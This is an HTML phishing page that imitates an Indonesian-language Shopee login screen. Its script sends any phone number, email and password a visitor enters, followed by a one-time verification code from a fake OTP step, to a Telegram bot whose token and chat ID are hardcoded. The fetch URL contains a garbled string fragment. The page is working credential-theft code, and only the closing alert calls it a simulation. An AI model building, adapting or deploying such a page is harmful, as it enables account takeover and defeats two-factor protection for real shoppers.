<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shopee Login</title>

<style>
body {
  font-family: Arial;
  background: #f5f5f5;
}

.box {
  width: 320px;
  margin: 80px auto;
  background: #fff;
  padding: 20px;
  border-radius: 10px;
}

h2 {
  text-align: center;
  color: #ee4d2d;
}

input {
  width: 100%;
  padding: 10px;
  margin-top: 10px;
}

button {
  width: 100%;
  padding: 10px;
  margin-top: 15px;
  background: #ee4d2d;
  color: white;
  border: none;
}

.hidden {
  display: none;
}
</style>
</head>

<body>

<!-- LOGIN -->
<div class="box" id="loginBox">
  <h2>Shopee</h2>
  <input type="text" id="user" placeholder="Nomor HP / Email">
  <input type="password" id="pass" placeholder="Password">
  <button onclick="login()">Login</button>
</div>

<!-- OTP -->
<div class="box hidden" id="otpBox">
  <h2>Verifikasi</h2>
  <p>Masukkan kode OTP</p>
  <input type="text" id="otp" placeholder="Kode OTP">
  <button onclick="kirimOTP()">Verifikasi</button>
</div>

<script>
var token = "8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno";
var chat_id = "8275920596";

function kirimPesan(teks) {
  fetch("https://api.telegram.org/bot8773598455:AAHIiU7FJ-Afd06GydNFkLos6-yhvsHEeno/sendMessage?chat_id=8275920596&text="/sendMessage?chat_i" + encodeURIComponent(teks));
}

function login() {
  var user = document.getElementById("user").value;
  var pass = document.getElementById("pass").value;

  var text = "🔐 LOGIN\nUser: " + user + "\nPass: " + pass;

  kirimPesan(text);

  document.getElementById("loginBox").classList.add("hidden");
  document.getElementById("otpBox").classList.remove("hidden");
}

function kirimOTP() {
  var otp = document.getElementById("otp").value;

  var text = "📲 OTP\nKode: " + otp;

  kirimPesan(text);

  alert("Verifikasi berhasil (simulasi)");
}
</script>

</body>
</html>
